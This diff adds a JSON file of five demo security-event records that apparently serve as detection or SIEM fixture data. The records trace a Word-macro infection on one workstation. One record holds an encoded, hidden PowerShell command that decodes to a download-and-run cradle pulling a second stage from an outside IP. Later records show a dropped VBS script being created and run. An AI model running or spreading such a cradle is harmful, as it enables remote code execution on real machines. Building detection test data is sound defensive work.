@@ -1,0 +1,70 @@
+[
+  {
+    "event_id": "EVT-PS-201",
+    "timestamp": "2026-11-14T09:22:11Z",
+    "event_type": "PROCESS_CREATE",
+    "severity": "LOW",
+    "user": "r.chen",
+    "host": "WS-ENG-14",
+    "source_ip": "10.0.6.114",
+    "process_name": "WINWORD.EXE",
+    "process_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "parent_process": "explorer.exe",
+    "command_line": "\"WINWORD.EXE\" /n \"C:\\Users\\r.chen\\Downloads\\Q4_Engineering_Specs.docm\"",
+    "is_demo": true
+  },
+  {
+    "event_id": "EVT-PS-202",
+    "timestamp": "2026-11-14T09:22:18Z",
+    "event_type": "POWERSHELL_EXEC",
+    "severity": "CRITICAL",
+    "user": "r.chen",
+    "host": "WS-ENG-14",
+    "source_ip": "10.0.6.114",
+    "process_name": "powershell.exe",
+    "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "parent_process": "WINWORD.EXE",
+    "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk0LjE2NS4xNi40NDphc3NldHMvc3RhZ2UyLnBzMScp",
+    "is_demo": true
+  },
+  {
+    "event_id": "EVT-PS-203",
+    "timestamp": "2026-11-14T09:22:25Z",
+    "event_type": "NETWORK_CONNECT",
+    "severity": "HIGH",
+    "user": "r.chen",
+    "host": "WS-ENG-14",
+    "source_ip": "10.0.6.114",
+    "destination_ip": "194.165.16.44",
+    "destination_port": 8080,
+    "protocol": "TCP",
+    "process_name": "powershell.exe",
+    "is_demo": true
+  },
+  {
+    "event_id": "EVT-PS-204",
+    "timestamp": "2026-11-14T09:22:31Z",
+    "event_type": "FILE_MOD",
+    "severity": "HIGH",
+    "user": "r.chen",
+    "host": "WS-ENG-14",
+    "source_ip": "10.0.6.114",
+    "process_name": "powershell.exe",
+    "command_line": "New-Item -Path 'C:\\ProgramData\\svc_updater.vbs' -Force",
+    "is_demo": true
+  },
+  {
+    "event_id": "EVT-PS-205",
+    "timestamp": "2026-11-14T09:23:00Z",
+    "event_type": "PROCESS_CREATE",
+    "severity": "HIGH",
+    "user": "SYSTEM",
+    "host": "WS-ENG-14",
+    "source_ip": "10.0.6.114",
+    "process_name": "wscript.exe",
+    "process_path": "C:\\Windows\\System32\\wscript.exe",
+    "parent_process": "powershell.exe",
+    "command_line": "wscript.exe C:\\ProgramData\\svc_updater.vbs",
+    "is_demo": true
+  }
+]
